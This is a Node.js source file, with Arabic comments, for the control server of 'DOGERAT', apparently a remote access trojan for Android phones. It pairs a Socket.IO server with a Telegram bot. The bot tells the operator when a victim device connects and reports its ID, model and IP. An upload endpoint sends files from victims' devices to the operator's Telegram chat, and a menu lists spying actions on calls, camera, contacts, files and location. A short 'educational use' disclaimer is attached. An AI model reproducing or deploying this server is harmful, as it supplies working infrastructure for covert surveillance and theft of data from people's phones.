const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});
const uploader = multer();

// تحميل بيانات الإعدادات
let data;
try {
    const dataPath = path.join(__dirname, 'data.json');
    data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
    console.log('✅ Data loaded successfully');
} catch (error) {
    console.error('❌ Error loading data.json:', error);
    process.exit(1);
}

// تهيئة البوت مع إعدادات محسنة
const bot = new TelegramBot(data.token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    },
    request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});

console.log('✅ Telegram bot initialized');

const appData = new Map();

// دالة لتنظيف النص من مشاكل HTML
function sanitizeText(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// دالة لإرسال رسائل آمنة
function sendSafeMessage(chatId, text, options = {}) {
    const safeText = sanitizeText(text);
    return bot.sendMessage(chatId, safeText, {
        parse_mode: 'HTML',
        ...options
    }).catch(error => {
        console.error('Error sending message:', error.message);
        // حاول إرسال الرسالة بدون تنسيق HTML في حالة الخطأ
        return bot.sendMessage(chatId, text.replace(/<[^>]*>/g, ''), options);
    });
}

// middleware أساسي
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// خدمة الملفات الثابتة
app.use(express.static('public'));

// endpoint لرفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded');
        }

        const fileBuffer = req.file.buffer;
        const fileName = req.file.originalname;
        
        bot.sendDocument(data.id, fileBuffer, {}, {
            filename: fileName,
            contentType: req.file.mimetype
        }).then(() => {
            res.send('✅ File uploaded successfully');
        }).catch(error => {
            console.error('File upload error:', error);
            res.status(500).send('Error uploading file');
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Error processing upload');
    }
});

// endpoint للحصول على المضيف
app.get('/host', (req, res) => {
    res.send(data.host || 'https://your-app.onrender.com/');
});

// endpoint للصحة
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        connectedDevices: io.sockets.sockets.size
    });
});

// endpoint الجذر
app.get('/', (req, res) => {
    res.json({
        message: 'DOGERAT Server is running',
        version: '1.0.0',
        endpoints: {
            health: '/health',
            host: '/host',
            upload: '/upload'
        }
    });
});

// التعامل مع اتصالات Socket
io.on('connection', socket => {
    try {
        const deviceId = socket.handshake.headers['device-id'] || 
                        socket.handshake.query.deviceId || 
                        socket.id;
        const deviceModel = socket.handshake.headers['user-agent'] || 
                           socket.handshake.query.model || 
                           'unknown-model';
        const deviceIp = socket.handshake.headers['x-forwarded-for'] || 
                        socket.handshake.address || 
                        'unknown-ip';
        const connectionTime = new Date().toLocaleString();

        socket.deviceId = deviceId;
        socket.deviceModel = deviceModel;

        console.log(`🔗 New device connected: ${deviceId}`);

        const connectMessage = `
<b>🟢 New Device Connected</b>

<b>Device ID:</b> ${deviceId}
<b>Model:</b> ${deviceModel}
<b>IP:</b> ${deviceIp}
<b>Time:</b> ${connectionTime}
        `.trim();

        sendSafeMessage(data.id, connectMessage);

        // التعامل مع انقطاع الاتصال
        socket.on('disconnect', (reason) => {
            console.log(`🔴 Device disconnected: ${deviceId}, Reason: ${reason}`);
            
            const disconnectMessage = `
<b>🔴 Device Disconnected</b>

<b>Device ID:</b> ${deviceId}
<b>Model:</b> ${deviceModel}
<b>Time:</b> ${new Date().toLocaleString()}
<b>Reason:</b> ${reason}
            `.trim();

            sendSafeMessage(data.id, disconnectMessage);
        });

        // التعامل مع الرسائل من الأجهزة
        socket.on('message', (message) => {
            const receivedMessage = `
<b>📨 Message Received</b>

<b>From:</b> ${deviceId}
<b>Message:</b> ${message}
            `.trim();

            sendSafeMessage(data.id, receivedMessage);
        });

        // التعامل مع الأخطاء
        socket.on('error', (error) => {
            console.error('Socket error:', error);
        });

    } catch (error) {
        console.error('Connection error:', error);
    }
});

// التعامل مع أوامر التليجرام
bot.on('message', (msg) => {
    try {
        const chatId = msg.chat.id;
        const messageText = msg.text;

        console.log(`📨 Received message from ${chatId}: ${messageText}`);

        if (messageText === '/start' || messageText === '/start@' + bot.options.username) {
            const welcomeMessage = `
<b>🤖 Welcome to DOGERAT Control Panel</b>

This is a remote device management system.

<b>Developed by:</b> @CYBERSHIELDX

<b>⚠️ Important:</b> Use responsibly and legally.
            `.trim();

            sendSafeMessage(chatId, welcomeMessage, {
                reply_markup: {
                    keyboard: [
                        ['📱 Devices', '⚡ Actions'],
                        ['ℹ️ About', '🔄 Refresh']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: false
                }
            });
        }
        else if (messageText === '📱 Devices' || messageText === '/devices') {
            const devicesCount = io.sockets.sockets.size;
            
            if (devicesCount === 0) {
                sendSafeMessage(chatId, '<b>❌ No devices connected</b>');
            } else {
                let devicesList = `<b>📱 Connected Devices: ${devicesCount}</b>\n\n`;
                let deviceIndex = 1;
                
                io.sockets.sockets.forEach((socket, id) => {
                    devicesList += `<b>${deviceIndex}. ${socket.deviceId || id}</b>\n`;
                    devicesList += `   <b>Model:</b> ${socket.deviceModel || 'Unknown'}\n`;
                    devicesList += `   <b>Connected:</b> ${socket.handshake.time ? new Date(socket.handshake.time).toLocaleString() : 'Unknown'}\n\n`;
                    deviceIndex++;
                });

                sendSafeMessage(chatId, devicesList, {
                    reply_markup: {
                        keyboard: [
                            ['📱 Devices', '⚡ Actions'],
                            ['ℹ️ About', '🔄 Refresh']
                        ],
                        resize_keyboard: true
                    }
                });
            }
        }
        else if (messageText === '⚡ Actions' || messageText === '/actions') {
            const actionsMessage = `
<b>⚡ Available Actions</b>

Select an action to perform on connected devices.

<b>Basic Actions:</b>
• 📞 Calls
• 📸 Camera  
• 📱 Contacts
• 📁 Files
• 📍 Location

<b>Note:</b> Some features require device permissions.
            `.trim();

            sendSafeMessage(chatId, actionsMessage, {
                reply_markup: {
                    keyboard: [
                        ['📞 Calls', '📸 Camera'],
                        ['📱 Contacts', '📁 Files'],
                        ['📍 Location', '📢 Notification'],
                        ['🔙 Main Menu']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
        else if (messageText === 'ℹ️ About' || messageText === '/about') {
            const aboutMessage = `
<b>ℹ️ About DOGERAT</b>

<b>Version:</b> 1.0.0
<b>Developer:</b> @CYBERSHIELDX
<b>Connected Devices:</b> ${io.sockets.sockets.size}

<b>⚠️ Disclaimer:</b>
This tool is for educational and authorized testing purposes only. Misuse is prohibited.
            `.trim();

            sendSafeMessage(chatId, aboutMessage);
        }
        else if (messageText === '🔙 Main Menu' || messageText === '🔙 Back to Main') {
            sendSafeMessage(chatId, '<b>🏠 Main Menu</b>', {
                reply_markup: {
                    keyboard: [
                        ['📱 Devices', '⚡ Actions'],
                        ['ℹ️ About', '🔄 Refresh']
                    ],
                    resize_keyboard: true
                }
            });
        }
        else if (messageText === '🔄 Refresh' || messageText === '/refresh') {
            const devicesCount = io.sockets.sockets.size;
            sendSafeMessage(chatId, `<b>🔄 Refreshed</b>\n\n<b>Connected Devices:</b> ${devicesCount}`);
        }
        else {
            // الرد على الرسائل غير المعروفة
            sendSafeMessage(chatId, '❓ Unknown command. Use /start to see available commands.');
        }

    } catch (error) {
        console.error('Bot message error:', error);
        bot.sendMessage(msg.chat.id, '❌ Error processing your request').catch(console.error);
    }
});

// إرسال ping دوري للأجهزة
setInterval(() => {
    try {
        const connectedCount = io.sockets.sockets.size;
        if (connectedCount > 0) {
            io.sockets.sockets.forEach((socket, id) => {
                socket.emit('ping', { 
                    timestamp: Date.now(),
                    serverTime: new Date().toISOString()
                });
            });
        }
    } catch (error) {
        console.error('Ping error:', error);
    }
}, 30000); // كل 30 ثانية

// الحفاظ على السيرفر نشط (لـ Render)
setInterval(() => {
    try {
        if (data.host && data.host.startsWith('http')) {
            https.get(data.host, (res) => {
                console.log('✅ Keep-alive ping sent successfully');
            }).on('error', (err) => {
                console.log('❌ Keep-alive ping failed:', err.message);
            });
        } else {
            // إذا لم يكن هناك host معرف، استخدم المنفذ المحلي
            http.get(`http://localhost:${process.env.PORT || 3000}/health`, (res) => {
                console.log('✅ Local health check passed');
            }).on('error', (err) => {
                console.log('❌ Local health check failed:', err.message);
            });
        }
    } catch (error) {
        console.error('Keep-alive error:', error);
    }
}, 120000); // كل دقيقتين

// معالجة الأخطاء غير الملتقطة
process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('💥 Uncaught Exception:', error);
    process.exit(1);
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Socket.IO server is active`);
    console.log(`🤖 Telegram bot is polling for messages`);
    console.log(`🌐 Health check: http://0.0.0.0:${PORT}/health`);
});

// إغلاق نظيف
process.on('SIGINT', () => {
    console.log('🛑 Shutting down gracefully...');
    bot.stopPolling();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
